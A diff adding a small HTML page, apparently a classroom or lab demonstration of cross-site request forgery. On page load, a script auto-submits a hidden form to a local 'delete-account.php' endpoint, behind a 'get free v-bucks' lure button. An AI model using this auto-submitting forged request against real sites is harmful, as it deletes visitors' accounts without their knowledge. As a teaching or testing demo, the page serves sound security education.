@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Dangerous website</title>
+  </head>
+  <body>
+    <header>
+      <h1>Dangerous website</h1>
+    </header>
+    <main>
+      <form action="http://localhost:8000/delete-account.php" id="form">
+        <button>get free v-bucks</button>
+      </form>
+    </main>
+    <script defer>
+      const form = document.getElementById('form');
+
+      window.onload = () => {
+        form.submit();
+      };
+    </script>
+  </body>
+</html>
